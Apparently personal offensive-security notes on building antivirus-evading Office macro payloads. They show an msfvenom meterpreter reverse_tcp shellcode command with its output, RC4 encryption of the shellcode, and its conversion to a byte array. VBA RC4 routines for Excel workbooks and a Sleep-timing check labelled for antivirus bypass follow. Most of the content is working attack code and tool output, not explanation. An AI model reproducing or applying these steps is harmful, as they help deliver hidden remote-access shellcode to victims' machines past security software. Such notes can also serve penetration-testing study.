
### On Kali

#### RC4

- generate random string for key
```bash
tr -dc 'A-Za-z0-9!"#$%&'\''()*+,-./:;<=>?@[\]^_`{|}~' </dev/urandom | head -c 30; echo
```
- could also use openssl: `openssl rand -base64 30` or `openssl rand -hex 30`
- encrypt shellcode
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$(hostname -I | cut -d' ' -f1) LPORT=9001 EXITFUNC=thread -f csharp -o mrtcp_csharp.txt
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 511 bytes
Final size of csharp file: 2628 bytes
Saved as: mrtcp_csharp.txt
❯ python3 rc4.py -k 'HLkkMYkLyJt]k=JWa-4frG4m^$;tx?' -f mrtcp_csharp.txt -o mrtcp_rc4.txt
File encrypted and saved as mrtcp_rc4.txt.enc
```
- copy to char array
```bash
xxd -i mrtcp_rc4.txt.enc
unsigned char mrtcp_rc4_txt_enc[] = {
  0xc3, 0x82, 0x14, 0xc3, 0x96, 0x08, 0x01, 0x44, 0xc3, 0x96, 0x22, 0xc2,
  0xa2, 0x53, 0xc2, 0xad, 0xc2, 0x91, 0x55, 0x1d, 0xc3, 0xb2, 0xc2, 0x81,
  0xc3, 0x9d, 0x36, 0x0d, 0xc2, 0xa0, 0xc3, 0x98, 0x58, 0xc3, 0xbf, 0xc3,
  0xac, 0x21, 0xc2, 0x97, 0x26, 0xc3, 0x8f, 0xc3, 0x81, 0xc3, 0xa2, 0xc3,
  0xa7, 0xc2, 0x8f, 0x3c, 0x60, 0xc3, 0xb1, 0xc3, 0xbf, 0x45, 0xc3, 0x92,
...
  0xc3, 0xad, 0xc3, 0xba, 0xc2, 0x85, 0x26, 0xc3, 0x84, 0xc2, 0xaf, 0xc3,
  0x84, 0xc3, 0xa1, 0xc3, 0x9d, 0x7b, 0xc2, 0x84, 0x26, 0xc2, 0x86, 0xc2,
  0xae, 0x61, 0x4e, 0xc3, 0x87, 0xc3, 0xb1, 0x2e, 0x70, 0xc2, 0x8c, 0x34
};
unsigned int mrtcp_rc4_txt_enc_len = 3948;
```
- save to a file and copy to clipboard

### Visual Basic 

```vb
Function RC4(key As String, data As String) As String
    Dim S(255) As Integer
    Dim T(255) As Integer
    Dim i As Integer, j As Integer, t As Integer
    Dim K As Integer
    Dim temp As Integer
    Dim output As String
    Dim keyLength As Integer
    Dim dataLength As Integer
    Dim keystream As Integer
    
    keyLength = Len(key)
    dataLength = Len(data)
    
    ' Initialize S and T
    For i = 0 To 255
        S(i) = i
        T(i) = Asc(Mid(key, (i Mod keyLength) + 1, 1))
    Next i
    
    ' Initial permutation of S
    j = 0
    For i = 0 To 255
        j = (j + S(i) + T(i)) Mod 256
        temp = S(i)
        S(i) = S(j)
        S(j) = temp
    Next i
    
    ' Perform the encryption/decryption
    i = 0
    j = 0
    output = ""
    
    For K = 1 To dataLength
        i = (i + 1) Mod 256
        j = (j + S(i)) Mod 256
        temp = S(i)
        S(i) = S(j)
        S(j) = temp
        t = (S(i) + S(j)) Mod 256
        keystream = S(t)
        output = output & Chr(Asc(Mid(data, K, 1)) Xor keystream)
    Next K
    
    RC4 = output
End Function

Sub TestRC4()
    Dim key As String
    Dim plaintext As String
    Dim ciphertext As String
    Dim decrypted As String
    
    key = "mysecretkey"
    plaintext = "Hello, World!"
    
    ' Encrypt the plaintext
    ciphertext = RC4(key, plaintext)
    Debug.Print "Ciphertext: " & ciphertext
    
    ' Decrypt the ciphertext
    decrypted = RC4(key, ciphertext)
    Debug.Print "Decrypted: " & decrypted
End Sub
```

- for Excel WB
```vb

Function RC4ByteArray(key() As Byte, data() As Byte) As Byte()
    Dim S(255) As Integer
    Dim t(255) As Integer
    Dim i As Integer, j As Integer, l As Integer
    
    Dim temp As Integer
    Dim keystream As Integer
    Dim k As Long
    Dim dataLength As Long
    Dim output() As Byte
    
    dataLength = UBound(data) - LBound(data) + 1
    ReDim output(LBound(data) To UBound(data))
    
    ' Initialize S and T
    For i = 0 To 255
        S(i) = i
        t(i) = key(i Mod (UBound(key) - LBound(key) + 1)) ' Key Scheduling
    Next i
    
    ' Initial permutation of S
    j = 0
    For i = 0 To 255
        j = (j + S(i) + t(i)) Mod 256
        temp = S(i)
        S(i) = S(j)
        S(j) = temp
    Next i
    
    ' Perform the encryption/decryption
    i = 0
    j = 0
    
    For k = LBound(data) To UBound(data)
        i = (i + 1) Mod 256
        j = (j + S(i)) Mod 256
        temp = S(i)
        S(i) = S(j)
        S(j) = temp
        l = (S(i) + S(j)) Mod 256
        keystream = S(l)
        output(k) = data(k) Xor keystream
    Next k
    
    RC4ByteArray = output
End Function

Sub TestRC4Macro()
    Dim key As String
    Dim plaintext As String
    Dim ciphertext() As Byte
    Dim decrypted() As Byte
    Dim keyBytes() As Byte
    Dim plaintextBytes() As Byte
    
    ' Example key and plaintext
    key = "mysecretkey"
    plaintext = "Hello, World!"
    
    ' Convert key and plaintext to byte arrays
    keyBytes = StrConv(key, vbFromUnicode)
    plaintextBytes = StrConv(plaintext, vbFromUnicode)
    
    ' Encrypt the plaintext
    ciphertext = RC4ByteArray(keyBytes, plaintextBytes)
    
    ' Print ciphertext as hex string
    Dim i As Integer
    Dim hexStr As String
    For i = LBound(ciphertext) To UBound(ciphertext)
        hexStr = hexStr & Right("00" & Hex(ciphertext(i)), 2)
    Next i
    Debug.Print "Ciphertext (hex): " & hexStr
    
    ' Decrypt the ciphertext
    decrypted = RC4ByteArray(keyBytes, ciphertext)
    
    ' Convert decrypted byte array back to string
    Dim decryptedText As String
    decryptedText = StrConv(decrypted, vbUnicode)
    
    Debug.Print "Decrypted: " & decryptedText
    
    ' Write results to Excel sheet
    Dim ws As Worksheet
    Set ws = ThisWorkbook.Sheets(1)
    
    ws.Cells(1, 1).Value = "Key"
    ws.Cells(1, 2).Value = key
    
    ws.Cells(2, 1).Value = "Plaintext"
    ws.Cells(2, 2).Value = plaintext
    
    ws.Cells(3, 1).Value = "Ciphertext (hex)"
    ws.Cells(3, 2).Value = hexStr
    
    ws.Cells(4, 1).Value = "Decrypted Text"
    ws.Cells(4, 2).Value = decryptedText
End Sub

```
### Sleep Function for AV Bypass

```vb
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
...
Dim t1 As Date
Dim t2 As Date
Dim time As Long

t1 = Now()
Sleep (2000)
t2 = Now()
time = DateDiff("s", t1, t2)

If time < 2 Then
    Exit Function
End If
...
```